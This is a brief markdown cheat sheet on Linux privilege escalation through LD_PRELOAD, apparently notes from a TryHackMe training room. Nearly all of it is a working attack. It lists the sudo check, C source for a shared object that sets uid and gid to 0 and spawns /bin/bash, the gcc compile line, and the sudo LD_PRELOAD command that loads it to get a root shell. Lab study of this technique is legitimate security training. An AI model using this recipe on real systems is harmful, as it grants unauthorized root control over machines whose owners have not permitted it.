# Linux Privilege Escalation
**************************************

## Leverage LD_PRELOAD

Check for LD_PRELOAD (with env_keep option)
```
sudo -l
```

Write a simple C code compiled as a share object (.so extension) file

* The C code will simply spawn a root shell and can be written as follows:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Save this code as shell.c and compile it using gcc into a shared object file using the following parameters
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

Run the program by specifying the LD_PRELOAD option, as follows:
```
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```
**************************************
## Reference
* https://tryhackme.com/room/linprivesc
